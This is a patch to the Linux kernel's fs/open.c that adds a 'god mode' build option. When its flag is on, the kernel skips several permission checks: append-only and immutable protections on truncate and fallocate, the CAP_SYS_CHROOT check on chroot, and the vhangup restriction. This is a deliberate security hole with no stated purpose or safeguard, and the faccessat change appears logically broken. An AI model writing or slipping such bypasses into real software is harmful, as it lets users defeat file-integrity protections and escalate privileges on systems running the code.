@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  *  linux/fs/open.c
  *
@@ -100,9 +103,15 @@ static long do_sys_truncate(const char __user *pathname, loff_t length)
 	if (error)
 		goto mnt_drop_write_and_out;
 
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
 	error = -EPERM;
 	if (IS_APPEND(inode))
 		goto mnt_drop_write_and_out;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	error = get_write_access(inode);
 	if (error)
@@ -169,9 +178,15 @@ static long do_sys_ftruncate(unsigned int fd, loff_t length, int small)
 	if (small && length > MAX_NON_LFS)
 		goto out_putf;
 
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
 	error = -EPERM;
 	if (IS_APPEND(inode))
 		goto out_putf;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	error = locks_verify_truncate(inode, file, length);
 	if (!error)
@@ -245,10 +260,26 @@ int do_fallocate(struct file *file, int mode, loff_t offset, loff_t len)
 
 	/* It's not possible punch hole on append only file */
 	if (mode & FALLOC_FL_PUNCH_HOLE && IS_APPEND(inode))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	if (IS_IMMUTABLE(inode))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	/*
 	 * Revalidate the write permissions, in case security policy has
@@ -347,6 +378,9 @@ SYSCALL_DEFINE3(faccessat, int, dfd, const char __user *, filename, int, mode)
 		 * MAY_EXEC on regular files is denied if the fs is mounted
 		 * with the "noexec" flag.
 		 */
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled)
+#endif
 		res = -EACCES;
 		if (path.mnt->mnt_flags & MNT_NOEXEC)
 			goto out_path_release;
@@ -444,9 +478,16 @@ SYSCALL_DEFINE1(chroot, const char __user *, filename)
 	if (error)
 		goto dput_and_out;
 
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
 	error = -EPERM;
 	if (!capable(CAP_SYS_CHROOT))
 		goto dput_and_out;
+
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	error = security_path_chroot(&path);
 	if (error)
 		goto dput_and_out;
@@ -1122,7 +1163,15 @@ SYSCALL_DEFINE0(vhangup)
 		tty_vhangup_self();
 		return 0;
 	}
-	return -EPERM;
+	
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 }
 
 /*
